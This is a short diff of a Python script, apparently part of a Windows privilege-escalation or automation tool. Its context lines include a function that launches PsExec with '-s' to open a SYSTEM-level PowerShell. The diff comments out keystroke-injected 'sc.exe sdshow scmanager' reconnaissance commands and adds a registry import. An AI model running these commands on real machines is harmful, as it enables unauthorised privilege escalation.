@@ -1,6 +1,7 @@
 import os
 import sys
 import time
+import winreg
 import pyautogui
 import subprocess
 from multiprocessing import Process
@@ -16,13 +17,13 @@ def priv_escaltion():
     #run exe file from path
     os.system("SysinternalsSuite\PsExec.exe -s powershell.exe")
     
-def commands():
-    time.sleep(2)
-    pyautogui.write("sc.exe sdshow scmanager")
-    pyautogui.press("enter")
-    pyautogui.write("sc.exe sdshow scmanager")
-    pyautogui.press("enter")
-    pass
+#def commands():
+#    time.sleep(2)
+#    pyautogui.write("sc.exe sdshow scmanager")
+#    pyautogui.press("enter")
+#    pyautogui.write("sc.exe sdshow scmanager")
+#    pyautogui.press("enter")
+#    pass
    
 def send_message(port, message):
     #send message
